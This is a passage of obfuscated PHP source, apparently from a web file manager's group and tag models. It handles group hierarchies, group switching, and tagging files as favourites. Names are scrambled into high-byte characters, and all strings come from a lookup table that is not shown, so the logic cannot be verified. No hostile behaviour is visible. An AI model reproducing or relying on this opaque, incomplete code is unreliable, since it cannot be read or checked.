array($Æş©°ú[1992] => array($Æş©°ú[7], $¥šÄÑõà)); $«ã’…¢¥ = array($Æş©°ú[1992], $Æş©°ú[2096] => $Æş©°ú[579]); $â²Ó³ıü = Model($Æş©°ú[2086])->field($«ã’…¢¥)->where($ÃŠ²È›¼)->group($Æş©°ú[1992])->select(); $‹‚Ù—³Ö = array_to_keyvalue($â²Ó³ıü, $Æş©°ú[1992], $Æş©°ú[579]); foreach ($¦–¤œ ù as &$­Û‚ò›) { $Ö’şàÜ† = $­Û‚ò›[$Æş©°ú[1992]]; $­Û‚ò›[$Æş©°ú[2098]] = isset($‹‚Ù—³Ö[$Ö’şàÜ†]) ? intval($‹‚Ù—³Ö[$Ö’şàÜ†]) : !1; } unset($­Û‚ò›); } private function _listAppendMeta(&$á×ô™¬Ã, $£öÁù²µ) { $­ ß­¦ =& $_SERVER[‹‰”››ê]; $öµæÕş¥ = array($­ ß­¦[1992] => array($­ ß­¦[7], $£öÁù²µ)); $º«¿Ö“Ñ = Model($­ ß­¦[2085])->where($öµæÕş¥)->select(); $º«¿Ö“Ñ = array_to_keyvalue_group($º«¿Ö“Ñ, $­ ß­¦[1992]); foreach ($º«¿Ö“Ñ as &$€ŞÓËãµ) { $€ŞÓËãµ = array_to_keyvalue($€ŞÓËãµ, $­ ß­¦[97], $­ ß­¦[462]); } unset($€ŞÓËãµ); foreach ($á×ô™¬Ã as &$…©©–¿û) { $…©©–¿û[$­ ß­¦[553]] = array(); if (isset($º«¿Ö“Ñ[$…©©–¿û[$­ ß­¦[1992]]])) { $…©©–¿û[$­ ß­¦[553]] = $º«¿Ö“Ñ[$…©©–¿û[$­ ß­¦[1992]]]; } } unset($…©©–¿û); } protected function parentLevelArray($Ò¾‘•Â­) { $İ†÷Øô§ =& $_SERVER[‹‰”››ê]; $Ò¾‘•Â­ = explode($İ†÷Øô§[50], trim($Ò¾‘•Â­, $İ†÷Øô§[50])); $Ò¾‘•Â­ = array_remove_value($Ò¾‘•Â­, $İ†÷Øô§[231]); return $Ò¾‘•Â­; } protected function parentInGroup($¡Ğá£Æ†, $²ÎÂóÕ­) { $¿Òø‘©µ =& $_SERVER[‹‰”››ê]; $ÒÅ½¬š = $this->getInfoSimple($¡Ğá£Æ†); if (!$ÒÅ½¬š) { return !0; } $—¤èœñ´ = $this->parentLevelArray($ÒÅ½¬š[$¿Òø‘©µ[598]]); $—¤èœñ´[] = $¡Ğá£Æ†; foreach ($—¤èœñ´ as $¡Ğá£Æ†) { if (in_array($¡Ğá£Æ† . $¿Òø‘©µ[12], $²ÎÂóÕ­)) { return !0; } } return !1; } private function _listAppendParent(&$ÄËÄÄ´§) { $¢™‹â°™ =& $_SERVER[‹‰”››ê]; $œà½Ô‹ = array(); foreach ($ÄËÄÄ´§ as &$ş Øó‘‰) { $œà½Ô‹[$ş Øó‘‰[$¢™‹â°™[1992]]] = $ş Øó‘‰[$¢™‹â°™[32]]; $˜»¶±Ñø = $this->parentLevelArray($ş Øó‘‰[$¢™‹â°™[598]]); foreach ($˜»¶±Ñø as $†áÃ£¥˜) { if (!isset($œà½Ô‹[$†áÃ£¥˜])) { $œà½Ô‹[$†áÃ£¥˜] = 0; } } } unset($ş Øó‘‰); foreach ($œà½Ô‹ as $’Ó»ßªù => $€»ï³Õ) { if ($€»ï³Õ) { continue; } $•ÊÈıÊÛ = $this->getInfoSimple($’Ó»ßªù); $œà½Ô‹[$’Ó»ßªù] = $•ÊÈıÊÛ[$¢™‹â°™[32]]; } $·õ·óØß = $GLOBALS[$¢™‹â°™[6]][$¢™‹â°™[92]][$¢™‹â°™[2099]]; if (KodUser::isRoot()) { $·õ·óØß = !1; } foreach ($ÄËÄÄ´§ as &$ş Øó‘‰) { $˜»¶±Ñø = $this->parentLevelArray($ş Øó‘‰[$¢™‹â°™[598]]); $ğÄÍÊì³ = $¢™‹â°™[12]; foreach ($˜»¶±Ñø as $’Ó»ßªù => $†áÃ£¥˜) { if ($·õ·óØß && $’Ó»ßªù == 0) { continue; } $ğÄÍÊì³ .= $œà½Ô‹[$†áÃ£¥˜] . $¢™‹â°™[8]; } if ($˜»¶±Ñø) { $ğÄÍÊì³ .= $ş Øó‘‰[$¢™‹â°™[32]]; } $ş Øó‘‰[$¢™‹â°™[603]] = str_replace($¢™‹â°™[257], $¢™‹â°™[8], $ğÄÍÊì³); } unset($ş Øó‘‰); } private function _listAppendSourceRoot(&$Å’éîœ, $‹ÖñÃˆ) { $îŞğİ‡¯ =& $_SERVER[‹‰”››ê]; $›ÏÅ…ı¨ = Model($îŞğİ‡¯[920])->listSourceRoot(SourceModel::TYPE_GROUP, $‹ÖñÃˆ); $›ÏÅ…ı¨ = array_to_keyvalue($›ÏÅ…ı¨, $îŞğİ‡¯[583]); $›ÏÅ…ı¨ = array_remove_key($›ÏÅ…ı¨, $îŞğİ‡¯[583]); foreach ($Å’éîœ as &$¿àĞÃ½ó) { $¿àĞÃ½ó[$îŞğİ‡¯[90]] = $›ÏÅ…ı¨[$¿àĞÃ½ó[$îŞğİ‡¯[1992]]] ? $›ÏÅ…ı¨[$¿àĞÃ½ó[$îŞğİ‡¯[1992]]] : array(); } unset($¿àĞÃ½ó); } protected function groupMerge($‘ëõØµÉ) { $‘ëõØµÉ = array_values(array_unique($‘ëõØµÉ)); $ø¢—ï = array(); for ($§É·í£Ü = 0; $§É·í£Ü < count($‘ëõØµÉ); $§É·í£Ü++) { $ìã…›“± = !1; for ($œ ÷Ë®Á = 0; $œ ÷Ë®Á < count($‘ëõØµÉ); $œ ÷Ë®Á++) { if ($§É·í£Ü == $œ ÷Ë®Á) { continue; } if ($this->isParentOf($‘ëõØµÉ[$œ ÷Ë®Á], $‘ëõØµÉ[$§É·í£Ü])) { $ìã…›“± = !0; break; } } if (!$ìã…›“±) { $ø¢—ï[] = $‘ëõØµÉ[$§É·í£Ü]; } } return $ø¢—ï; } protected function isParentOf($ôÄ¤ëî, $îøÂÇ’·) { $ëêÚ›§  =& $_SERVER[‹‰”››ê]; if (!$ôÄ¤ëî || !$îøÂÇ’· || $ôÄ¤ëî == $îøÂÇ’·) { return !1; } $¨ÉÚŸä = $this->getInfoSimple($ôÄ¤ëî); $ú•úßà» = $this->getInfoSimple($îøÂÇ’·); $ÑÔ…í½ = $¨ÉÚŸä[$ëêÚ›§ [598]] . $ôÄ¤ëî . $ëêÚ›§ [50]; if (substr($ú•úßà»[$ëêÚ›§ [598]], 0, strlen($ÑÔ…í½)) == $ÑÔ…í½) { return !0; } return !1; } public function groupShowRoot($ó‘ÆÎ˜ù, $¥¤Ö¡š¦ = false) { $½è‡·œ˜ =& $_SERVER[‹‰”››ê]; $åİ­„Ä˜ = $this->getInfo($ó‘ÆÎ˜ù); if (!$åİ­„Ä˜) { return array(); } $šé±Ÿ«‰ = $this->parentLevelArray($åİ­„Ä˜[$½è‡·œ˜[598]]); $–àË½µ = array($ó‘ÆÎ˜ù); if (count($šé±Ÿ«‰) == 0) { return $–àË½µ; } if ($¥¤Ö¡š¦ && count($šé±Ÿ«‰) == 1) { return $–àË½µ; } if (!$åİ­„Ä˜[$½è‡·œ˜[553]] || !isset($åİ­„Ä˜[$½è‡·œ˜[553]][$½è‡·œ˜[2082]]) || $åİ­„Ä˜[$½è‡·œ˜[553]][$½è‡·œ˜[2082]] == $½è‡·œ˜[866]) { return $this->groupShowRoot($šé±Ÿ«‰[count($šé±Ÿ«‰) - 1], $¥¤Ö¡š¦); } if ($åİ­„Ä˜[$½è‡·œ˜[553]][$½è‡·œ˜[2082]] == $½è‡·œ˜[444]) { $“û÷ßã– = explode($½è‡·œ˜[50], $åİ­„Ä˜[$½è‡·œ˜[553]][$½è‡·œ˜[2083]]); if ($“û÷ßã–) { $–àË½µ = array_merge($–àË½µ, $“û÷ßã–); } } return $–àË½µ; } protected function resetParentLevel() { $È¾èÓ”Ã =& $_SERVER[‹‰”››ê]; $ş§é§ãº = $È¾èÓ”Ã[1992]; $£‚ïÚğ = $this->select(); $£‚ïÚğ = array_to_keyvalue($£‚ïÚğ, $ş§é§ãº); foreach ($£‚ïÚğ as $×ş¢ûåû) { $Æñó˜ = $×ş¢ûåû; $¢±¸‹²• = array(); while ($Æñó˜[$È¾èÓ”Ã[193]] != 0) { $¢±¸‹²•[] = $Æñó˜[$È¾èÓ”Ã[193]]; $Æñó˜ = $£‚ïÚğ[$Æñó˜[$È¾èÓ”Ã[193]]]; } $¢±¸‹²•[] = 0; $¢±¸‹²• = $È¾èÓ”Ã[50] . implode($È¾èÓ”Ã[50], array_reverse($¢±¸‹²•)) . $È¾èÓ”Ã[50]; $this->setNamePinyin($×ş¢ûåû[$ş§é§ãº], $×ş¢ûåû[$È¾èÓ”Ã[32]]); $this->where(array($ş§é§ãº => $×ş¢ûåû[$ş§é§ãº]))->save(array($È¾èÓ”Ã[669] => $¢±¸‹²•)); } return $£‚ïÚğ; } public function groupNameAuto($Êñ¹¶ş, $ÌîÄõÎ™) { $ ¾Íˆëù =& $_SERVER[‹‰”››ê]; $¶Ä¸µ¥Á = $this->where(array($ ¾Íˆëù[489] => $Êñ¹¶ş))->getField($ ¾Íˆëù[32], !0); if (!$¶Ä¸µ¥Á || !in_array($ÌîÄõÎ™, $¶Ä¸µ¥Á)) { return $ÌîÄõÎ™; } for ($ÓÚàåÉ = 1; $ÓÚàåÉ <= count($¶Ä¸µ¥Á) + 1; $ÓÚàåÉ++) { $î¢ƒ†ï = $ÌîÄõÎ™ . "\50{$ÓÚàåÉ}\x29"; if (!in_array($î¢ƒ†ï, $¶Ä¸µ¥Á)) { return $î¢ƒ†ï; } } } public function groupSwitch($Ğš‘Ù, $ÂŞ¦¢İÎ) { $¯¿›¬Õ® =& $_SERVER[‹‰”››ê]; $èÅÑ…ÍŠ = array($¯¿›¬Õ®[1992] => array($¯¿›¬Õ®[7], array($Ğš‘Ù, $ÂŞ¦¢İÎ))); $–¾õ¯î® = $this->where($èÅÑ…ÍŠ)->select(); $–¾õ¯î® = array_to_keyvalue($–¾õ¯î®, $¯¿›¬Õ®[1992]); if (!isset($–¾õ¯î®[$Ğš‘Ù]) || !isset($–¾õ¯î®[$ÂŞ¦¢İÎ]) || $–¾õ¯î®[$Ğš‘Ù][$¯¿›¬Õ®[193]] == 0) { return !1; } $èÅÑ…ÍŠ = array($¯¿›¬Õ®[1992] => $Ğš‘Ù); $Şš¦ñ×õ = Model($¯¿›¬Õ®[2086])->where($èÅÑ…ÍŠ)->select(); if (!$Şš¦ñ×õ) { $Şš¦ñ×õ = array(); } foreach ($Şš¦ñ×õ as $ì¤ø¦è´) { $«¡•œíÆ = $ì¤ø¦è´[$¯¿›¬Õ®[1791]]; $èÅÑ…ÍŠ = array($¯¿›¬Õ®[1791] => $«¡•œíÆ, $¯¿›¬Õ®[1992] => $ÂŞ¦¢İÎ); $¨ŞÆ²ß = Model($¯¿›¬Õ®[2086])->where($èÅÑ…ÍŠ)->find(); if (!$¨ŞÆ²ß) { $ì™ÚíÇ° = array($ÂŞ¦¢İÎ => $ì¤ø¦è´[$¯¿›¬Õ®[2100]]); Model($¯¿›¬Õ®[611])->userGroupAdd($«¡•œíÆ, $ì™ÚíÇ°); } Model($¯¿›¬Õ®[611])->userGroupRemove($«¡•œíÆ, $Ğš‘Ù); } $èÅÑ…ÍŠ = array($¯¿›¬Õ®[191] => 2, $¯¿›¬Õ®[193] => 0, $¯¿›¬Õ®[497] => 1, $¯¿›¬Õ®[583] => array($¯¿›¬Õ®[7], array($Ğš‘Ù, $ÂŞ¦¢İÎ))); $ÓßÑÀš¿ = Model($¯¿›¬Õ®[920])->where($èÅÑ…ÍŠ)->field($¯¿›¬Õ®[2101])->select(); $ÓßÑÀš¿ = array_to_keyvalue($ÓßÑÀš¿, $¯¿›¬Õ®[583], $¯¿›¬Õ®[194]); $ïÁâÇ¿ñ = !empty($ÓßÑÀš¿[$Ğš‘Ù]) ? $ÓßÑÀš¿[$Ğš‘Ù] : !1; if ($ïÁâÇ¿ñ) { if (!$ÓßÑÀš¿[$ÂŞ¦¢İÎ]) { $ÓßÑÀš¿[$ÂŞ¦¢İÎ] = Model($¯¿›¬Õ®[920])->groupRootAdd($ÂŞ¦¢İÎ); } $ôâß¼èæ = $ÓßÑÀš¿[$ÂŞ¦¢İÎ]; $èÅÑ…ÍŠ = array($¯¿›¬Õ®[193] => $ïÁâÇ¿ñ); $ÓßÑÀš¿ = Model($¯¿›¬Õ®[920])->where($èÅÑ…ÍŠ)->field($¯¿›¬Õ®[2102])->select(); if (!$ÓßÑÀš¿) { $ÓßÑÀš¿ = array(); } Model($¯¿›¬Õ®[920])->moveClearAuth = !1; foreach ($ÓßÑÀš¿ as $óå¤à×) { $şÊ˜²É‚ = $óå¤à×[$¯¿›¬Õ®[497]] == $¯¿›¬Õ®[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¯¿›¬Õ®[920])->move($óå¤à×[$¯¿›¬Õ®[194]], $ôâß¼èæ, $şÊ˜²É‚); } Model($¯¿›¬Õ®[920])->moveClearAuth = !0; $èÅÑ…ÍŠ = array($¯¿›¬Õ®[191] => 2, $¯¿›¬Õ®[583] => $Ğš‘Ù); $‚‹ßÃô… = array($¯¿›¬Õ®[583] => $ÂŞ¦¢İÎ); Model($¯¿›¬Õ®[2103])->where($èÅÑ…ÍŠ)->save($‚‹ßÃô…); Model($¯¿›¬Õ®[2104])->where($èÅÑ…ÍŠ)->save($‚‹ßÃô…); } $this->_changeChildLevel($–¾õ¯î®[$Ğš‘Ù], $–¾õ¯î®[$ÂŞ¦¢İÎ], !0); $this->where(array($¯¿›¬Õ®[193] => $Ğš‘Ù))->save(array($¯¿›¬Õ®[193] => $ÂŞ¦¢İÎ)); $this->_clearChildrenCache($–¾õ¯î®[$ÂŞ¦¢İÎ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\162\137\146\x61\x76"; protected function cacheFunctionAlias($‚ÃóØ’µ) { $ÇÒá«Ìª =& $_SERVER[‹‰”››ê]; return array($ÇÒá«Ìª[2105] => array($‚ÃóØ’µ[0], $ÇÒá«Ìª[2106]), $ÇÒá«Ìª[2107] => array($‚ÃóØ’µ[0], $ÇÒá«Ìª[2108])); } protected function get($ÅØô€’é) { $º»Ñ£«¢ =& $_SERVER[‹‰”››ê]; $¿Ñ¤Ã†¸ = Model($º»Ñ£«¢[599])->metaGet($ÅØô€’é, $º»Ñ£«¢[2109]); $ç²ôµÊ = json_decode($¿Ñ¤Ã†¸, !0); return $ç²ôµÊ ? $ç²ôµÊ : array($º»Ñ£«¢[2110] => $º»Ñ£«¢[91], $º»Ñ£«¢[457] => array()); } protected function set($ƒ•ò¨™—, $Ñ“ŞğòŒ) { $ØÀÚˆ¯ş =& $_SERVER[‹‰”››ê]; $Ñ“ŞğòŒ = $Ñ“ŞğòŒ ? $Ñ“ŞğòŒ : array($ØÀÚˆ¯ş[2110] => $ØÀÚˆ¯ş[91], $ØÀÚˆ¯ş[457] => array()); return Model($ØÀÚˆ¯ş[599])->metaSet($ƒ•ò¨™—, $ØÀÚˆ¯ş[2109], json_encode($Ñ“ŞğòŒ)); } protected function getByTagID($ şä¡Æ§, $´Ôıôı) { $ûŸ²ê†  =& $_SERVER[‹‰”››ê]; if (!$ şä¡Æ§ || !$´Ôıôı) { return !1; } if (!Model($ûŸ²ê† [599])->getInfoSimple($ şä¡Æ§)) { return !1; } $ËÀÖü·œ = $this->get($ şä¡Æ§); if (!$ËÀÖü·œ || !isset($ËÀÖü·œ[$ûŸ²ê† [457]])) { return !1; } $õ³ÉÍÀá = array_find_by_field($ËÀÖü·œ[$ûŸ²ê† [457]], $ûŸ²ê† [487], $´Ôıôı); return is_array($õ³ÉÍÀá) ? $õ³ÉÍÀá : !1; } public function listSource($½ë˜™¦È, $é£‚Š×Œ) { $ÑñÌÍÑÒ =& $_SERVER[‹‰”››ê]; if ($é£‚Š×Œ && !is_array($é£‚Š×Œ)) { $é£‚Š×Œ = array($é£‚Š×Œ); } $ƒ˜éƒÎ = $this->listData($½ë˜™¦È); $Â’íŠÎ· = array(); foreach ($ƒ˜éƒÎ as $«ñë°Å) { $Èø£˜¬ = $«ñë°Å[$ÑñÌÍÑÒ[87]]; if (!$Èø£˜¬) { continue; } if (!isset($Â’íŠÎ·[$Èø£˜¬])) { $Â’íŠÎ·[$Èø£˜¬] = array(); } $Â’íŠÎ·[$Èø£˜¬][] = $«ñë°Å[$ÑñÌÍÑÒ[512]]; } $½ƒ°ù°¸ = array(); foreach ($Â’íŠÎ· as $©ƒ¦‰Ê => $€£†¹Ê™) { $ñà×ñò… = !0; if (!$é£‚Š×Œ) { $½ƒ°ù°¸[] = $©ƒ¦‰Ê; continue; } foreach ($é£‚Š×Œ as $âÇ†âÜŸ) { if (!in_array($âÇ†âÜŸ, $€£†¹Ê™)) { $ñà×ñò… = !1; break; } } if ($ñà×ñò…) { $½ƒ°ù°¸[] = $©ƒ¦‰Ê; } } if (!$½ƒ°ù°¸) { return array(); } $Õ«ŞßæÛ = array($ÑñÌÍÑÒ[503] => array($ÑñÌÍÑÒ[504], $½ƒ°ù°¸), $ÑñÌÍÑÒ[583] => $½ë˜™¦È, $ÑñÌÍÑÒ[191] => SourceModel::TYPE_GROUP); $€–øòÕÀ = Model($ÑñÌÍÑÒ[1437])->listSource($Õ«ŞßæÛ); if (!$€–øòÕÀ || count($½ƒ°ù°¸) == $€–øòÕÀ[$ÑñÌÍÑÒ[454]][$ÑñÌÍÑÒ[455]]) { return $€–øòÕÀ; } $Åìï¨ÔÄ = array(); $‘øç… = array_to_keyvalue($€–øòÕÀ[$ÑñÌÍÑÒ[85]], $ÑñÌÍÑÒ[12], $ÑñÌÍÑÒ[194]); $ËËëş¤— = array_to_keyvalue($€–øòÕÀ[$ÑñÌÍÑÒ[86]], $ÑñÌÍÑÒ[12], $ÑñÌÍÑÒ[194]); $Ñ„ó³ïÕ = array_merge($ËËëş¤—, $‘øç…); foreach ($½ƒ°ù°¸ as $Èø£˜¬) { if (!in_array($Èø£˜¬, $Ñ„ó³ïÕ)) { $Åìï¨ÔÄ[] = $Èø£˜¬; } } if ($Åìï¨ÔÄ) { $this->removeBySource($½ë˜™¦È, $Åìï¨ÔÄ); } return $€–øòÕÀ; } protected function listData($Ô‡™ËÌ•) { $ÒóÚÄÆ¶ =& $_SERVER[‹‰”››ê]; $ù„À¿”Ò = array($ÒóÚÄÆ¶[1782] => 0, $ÒóÚÄÆ¶[571] => array($ÒóÚÄÆ¶[2111], 0), $ÒóÚÄÆ¶[508] => $ÒóÚÄÆ¶[2112] . $Ô‡™ËÌ•); $ÑÖÚÅÉ = $ÒóÚÄÆ¶[2113]; $Ñ´ÆúÜÄ = $this->field($ÑÖÚÅÉ)->where($ù„À¿”Ò)->order($ÒóÚÄÆ¶[2114])->select(); return $Ñ´ÆúÜÄ ? $Ñ´ÆúÜÄ : array(); } protected function addToTag($ Ù§’ìå, $öÊ–Ì¨Ş, $ÒÑêšĞ€) { $¥Ÿ˜Ïû³ =& $_SERVER[‹‰”››ê]; if (!$this->getByTagID($ Ù§’ìå, $ÒÑêšĞ€) || !$öÊ–Ì¨Ş) { return !1; } if (!Model($¥Ÿ˜Ïû³[920])->pathInfo($öÊ–Ì¨Ş)) { return !1; } $È®šÑ‰ = array($¥Ÿ˜Ïû³[1782] => 0, $¥Ÿ˜Ïû³[571] => $ÒÑêšĞ€, $¥Ÿ˜Ïû³[507] => $öÊ–Ì¨Ş, $¥Ÿ˜Ïû³[508] => $¥Ÿ˜Ïû³[2115] . $ Ù§’ìå, $¥Ÿ˜Ïû³[506] => $¥Ÿ˜Ïû³[12], $¥Ÿ˜Ïû³[1996] => 0); if ($this->where($È®šÑ‰)->find()) { return !1; } return $this->add($È®šÑ‰); } protected function removeFromTag($ûÔ›ñá, $¥ÓÔ°Ö´, $¾ÙëÜÙ¬) { $Û‡æ¿ =& $_SERVER[‹‰”››ê]; if (!$this->getByTagID($ûÔ›ñá, $¾ÙëÜÙ¬) || !$¥ÓÔ°Ö´) { return !1; } if (is_array($¥ÓÔ°Ö´)) { $¥ÓÔ°Ö´ = array($Û‡æ¿[7], $¥ÓÔ°Ö´); } $–‘½¼Ùó = array($Û‡æ¿[1782] => 0, $Û‡æ¿[571] => $¾ÙëÜÙ¬, $Û‡æ¿[508] => $Û‡æ¿[2115] . $ûÔ›ñá, $Û‡æ¿[507] => $¥ÓÔ°Ö´); return $this->where($–‘½¼Ùó)->delete(); } protected function removeByTag($¡”ğàµÒ, $µêã›ö¨) { $åŒËŸÈÓ =& $_SERVER[‹‰”››ê]; if (!$this->getByTagID($¡”ğàµÒ, $µêã›ö¨)) { return !1; } $ªíìš¿õ = array($åŒËŸÈÓ[1782] => 0, $åŒËŸÈÓ[571] => $µêã›ö¨, $åŒËŸÈÓ[508] => $åŒËŸÈÓ[2115] . $¡”ğàµÒ); return $this->where($ªíìš¿õ)->delete(); } protected function removeBySource($…·¹ÙÆ, $×æ‰Ì†) { $š¢‹úİÂ =& $_SERVER[‹‰”››ê]; if (!$…·¹ÙÆ || !$×æ‰Ì†) { return !1; } if (is_array($×æ‰Ì†)) { $×æ‰Ì† = array($š¢‹úİÂ[7], $×æ‰Ì†); } $ù¡ÉÀÒ¹ = array($š¢‹úİÂ[1782] => 0, $š¢‹úİÂ[507] => $×æ‰Ì†, $š¢‹úİÂ[571] => array($š¢‹úİÂ[1107], 0), $š¢‹úİÂ[508] => $š¢‹úİÂ[2115] . $…·¹ÙÆ); return $this->where($ù¡ÉÀÒ¹)->delete(); } } goto c¬›Ü¿—ºµ; aš†—ù››: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($İÊĞÎùŒ) { $¨Û¯Š´ =& $_SERVER[‹‰”››ê]; return array($¨Û¯Š´[2107] => array($¨Û¯Š´[2540] . USER_ID, $¨Û¯Š´[2108])); } protected function listData() { $§·²š£Š =& $_SERVER[‹‰”››ê]; $œ¾Ÿ¤×â = array($§·²š£Š[1782] => USER_ID, $§·²š£Š[571] => array($§·²š£Š[2111], 0)); $Ê¯Øà…¦ = $§·²š£Š[2541]; $¥Ñ‘ËªŞ = $this->field($Ê¯Øà…¦)->where($œ¾Ÿ¤×â)->order($§·²š£Š[2114])->select(); return $¥Ñ‘ËªŞ ? $¥Ñ‘ËªŞ : array(); } protected function addToTag($ÁÃÌÆ“ó, $üıºÙåÕ) { $¤ª¡·´ğ =& $_SERVER[‹‰”››ê]; if (!Model($¤ª¡·´ğ[2264])->listData($üıºÙåÕ)) { return !1; } if (is_numeric($ÁÃÌÆ“ó)) { $‘ÌÏ©Ì = Model($¤ª¡·´ğ[920])->pathInfo($ÁÃÌÆ“ó); if (!$‘ÌÏ©Ì) { return !1; } } else { $‘ÌÏ©Ì = IO::infoSimple($ÁÃÌÆ“ó); if (!$‘ÌÏ©Ì) { return !1; } $ú–ÒÃ³ç = $‘ÌÏ©Ì[$¤ª¡·´ğ[32]]; $Æ¯ºúÙ = $‘ÌÏ©Ì[$¤ª¡·´ğ[33]]; if (isset($‘ÌÏ©Ì[$¤ª¡·´ğ[497]])) { $Æ¯ºúÙ = $‘ÌÏ©Ì[$¤ª¡·´ğ[497]] == $¤ª¡·´ğ[91] ? $¤ª¡·´ğ[78] : $¤ª¡·´ğ[233]; } } $Ï®­âÏ = array($¤ª¡·´ğ[1782] => USER_ID, $¤ª¡·´ğ[571] => $üıºÙåÕ, $¤ª¡·´ğ[507] => $ÁÃÌÆ“ó, $¤ª¡·´ğ[508] => $Æ¯ºúÙ ? $Æ¯ºúÙ : $¤ª¡·´ğ[502], $¤ª¡·´ğ[506] => $ú–ÒÃ³ç ? $ú–ÒÃ³ç : $¤ª¡·´ğ[12], $¤ª¡·´ğ[1996] => 0); if ($this->where($Ï®­âÏ)->find()) { return !1; } return $this->add($Ï®­âÏ); } protected function removeFromTag($¤‹æßù, $Áş©·ô) { $å¾°‹ÌÀ =& $_SERVER[‹‰”››ê]; if (!Model($å¾°‹ÌÀ[2264])->listData($Áş©·ô)) { return !1; } if (is_array($¤‹æßù)) { $¤‹æßù = array($å¾°‹ÌÀ[7], $¤‹æßù); } $°´¸Œ¸î = array($å¾°‹ÌÀ[1782] => USER_ID, $å¾°‹ÌÀ[571] => $Áş©·ô, $å¾°‹ÌÀ[507] => $¤‹æßù); return $this->where($°´¸Œ¸î)->delete(); } protected function removeByTag($ñ¼†İšÄ) { $Í¿°ÛÑ =& $_SERVER[‹‰”››ê]; if (!$ñ¼†İšÄ) { return !1; } $¦ç£÷× = array($Í¿°ÛÑ[1782] => USER_ID, $Í¿°ÛÑ[571] => $ñ¼†İšÄ); return $this->where($¦ç£÷×)->delete(); } protected function removeBySource($¾ÃÇ© ) { $†á‹‹Î‡ =& $_SERVER[‹‰”››ê]; if (is_array($¾ÃÇ© )) { $¾ÃÇ©  = array($†á‹‹Î‡[7], $¾ÃÇ© ); } $ŸæÖáé¯ = array($†á‹‹Î‡[1782] => USER_ID, $†á‹‹Î‡[571] => array($†á‹‹Î‡[1107], 0), $†á‹‹Î‡[507] => $¾ÃÇ© ); return $this->where($ŸæÖáé¯)->delete(); } }